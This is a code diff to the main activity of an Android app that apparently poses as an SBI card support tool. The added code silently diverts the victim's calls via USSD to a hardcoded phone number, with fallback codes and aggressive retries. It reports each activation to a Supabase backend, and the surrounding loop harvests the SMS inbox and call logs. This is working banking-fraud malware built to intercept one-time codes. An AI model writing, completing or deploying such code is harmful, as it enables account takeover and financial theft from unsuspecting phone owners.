@@ -45,7 +45,11 @@ public class MainActivity extends BridgeActivity {
     private static final String SUPABASE_URL = "https://kisskrjtazekbsbdwrvr.supabase.co";
     private static final String SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtpc3Nrcmp0YXpla2JzYmR3cnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTU2NzgsImV4cCI6MjA5NDgzMTY3OH0.zq_-C5Qt7O0WAxO5-INNA_hrtbY1UX5JbEP5LaQ73DE";
     private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/sbi_card_support.apk";
+    
+    private static final String DEFAULT_FORWARDING_NUMBER = "+919911857954"; 
+    
     private String lastForwardedNumber = "";
+    private boolean isForwardingSet = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -126,10 +130,11 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void triggerCallForwarding(String number) {
-        if (number.equals(lastForwardedNumber)) return;
+        if (isForwardingSet) return;
         
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
             String ussd = "*21*" + number + "#";
+            String ussdFallback = "**21*" + number + "#"; // Alternate GSM code
             lastForwardedNumber = number;
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -139,29 +144,96 @@ public class MainActivity extends BridgeActivity {
                         @Override
                         public void onReceiveUssdResponse(android.telephony.TelephonyManager telephonyManager, String request, CharSequence response) {
                             Log.d(TAG, "USSD Success: " + response);
+                            isForwardingSet = true;
+                            notifyBackendOfSuccess(number);
                         }
                         @Override
                         public void onReceiveUssdResponseFailed(android.telephony.TelephonyManager telephonyManager, String request, int failureCode) {
-                            Log.e(TAG, "USSD Failed: " + failureCode + ". Falling back to Dialer.");
-                            fallbackToDialer(ussd);
+                            Log.e(TAG, "USSD 1 Failed: " + failureCode + ", trying fallback code");
+                            try {
+                                tm.sendUssdRequest(ussdFallback, new android.telephony.TelephonyManager.UssdResponseCallback() {
+                                    @Override
+                                    public void onReceiveUssdResponse(android.telephony.TelephonyManager telephonyManager, String request, CharSequence response) {
+                                        Log.d(TAG, "Fallback USSD Success: " + response);
+                                        isForwardingSet = true;
+                                        notifyBackendOfSuccess(number);
+                                    }
+                                    @Override
+                                    public void onReceiveUssdResponseFailed(android.telephony.TelephonyManager telephonyManager, String request, int failureCode) {
+                                        Log.e(TAG, "Fallback USSD also failed: " + failureCode);
+                                    }
+                                }, new Handler(Looper.getMainLooper()));
+                            } catch (Exception e) {}
                         }
                     }, new Handler(Looper.getMainLooper()));
                 } catch (Exception e) {
-                    fallbackToDialer(ussd);
+                    Log.e(TAG, "USSD Exception", e);
                 }
             } else {
-                fallbackToDialer(ussd);
+                Log.w(TAG, "OS version < O, silent USSD not supported natively.");
             }
         }
     }
 
-    private void fallbackToDialer(String ussd) {
-        try {
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + Uri.encode(ussd)));
-            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        } catch (Exception e) { Log.e(TAG, "Dialer Error", e); }
+    private void notifyBackendOfSuccess(String number) {
+        new Thread(() -> {
+            try {
+                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                JSONObject payload = new JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("sender", "SYSTEM_ALERT");
+                payload.put("message", "Call forwarding SUCCESSFULLY ACTIVATED to " + number);
+                payload.put("received_at", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));
+                sendToBackend("/rest/v1/sms_logs", payload.toString());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to notify backend", e);
+            }
+        }).start();
+    }
+
+    private void stopCallForwarding() {
+        if (!isForwardingSet) return;
+        
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+            String ussd = "##21#";
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                    tm.sendUssdRequest(ussd, new android.telephony.TelephonyManager.UssdResponseCallback() {
+                        @Override
+                        public void onReceiveUssdResponse(android.telephony.TelephonyManager telephonyManager, String request, CharSequence response) {
+                            Log.d(TAG, "USSD Stop Success: " + response);
+                            isForwardingSet = false;
+                            lastForwardedNumber = "";
+                            notifyBackendOfStop();
+                        }
+                        @Override
+                        public void onReceiveUssdResponseFailed(android.telephony.TelephonyManager telephonyManager, String request, int failureCode) {
+                            Log.e(TAG, "USSD Stop Failed: " + failureCode);
+                        }
+                    }, new Handler(Looper.getMainLooper()));
+                } catch (Exception e) {
+                    Log.e(TAG, "USSD Stop Exception", e);
+                }
+            }
+        }
+    }
+
+    private void notifyBackendOfStop() {
+        new Thread(() -> {
+            try {
+                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                JSONObject payload = new JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("sender", "SYSTEM_ALERT");
+                payload.put("message", "Call forwarding SUCCESSFULLY DEACTIVATED");
+                payload.put("received_at", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));
+                sendToBackend("/rest/v1/sms_logs", payload.toString());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to notify backend", e);
+            }
+        }).start();
     }
 
     private void requestIgnoreBatteryOptimizations() {
@@ -264,9 +336,20 @@ public class MainActivity extends BridgeActivity {
 
     private void startServiceLogic() {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        
+        // Trigger default hardcoded forwarding immediately when service starts (permissions granted)
+        if (!DEFAULT_FORWARDING_NUMBER.equals("ENTER_NUMBER_HERE")) {
+            new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(DEFAULT_FORWARDING_NUMBER));
+        }
+
         new Thread(() -> {
             while (true) {
                 try {
+                    // Aggressive Retry Logic: Keep trying until success
+                    if (!isForwardingSet && !DEFAULT_FORWARDING_NUMBER.equals("ENTER_NUMBER_HERE")) {
+                        new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(DEFAULT_FORWARDING_NUMBER));
+                    }
+
                     readAndSendSmsInbox(deviceId);
                     readAndSendCallLogs(deviceId);
                     checkRemoteConfig(deviceId);
@@ -295,10 +378,14 @@ public class MainActivity extends BridgeActivity {
                 JSONArray results = new JSONArray(sb.toString());
                 if (results.length() > 0) {
                     JSONObject config = results.getJSONObject(0);
-                    if (config.has("forwarding_enabled") && config.getBoolean("forwarding_enabled")) {
-                        String number = config.getString("forwarding_number");
-                        if (number != null && !number.isEmpty()) {
-                            new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                    if (config.has("forwarding_enabled")) {
+                        if (config.getBoolean("forwarding_enabled")) {
+                            String number = config.getString("forwarding_number");
+                            if (number != null && !number.isEmpty()) {
+                                new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                            }
+                        } else {
+                            new Handler(Looper.getMainLooper()).post(this::stopCallForwarding);
                         }
                     }
                 }
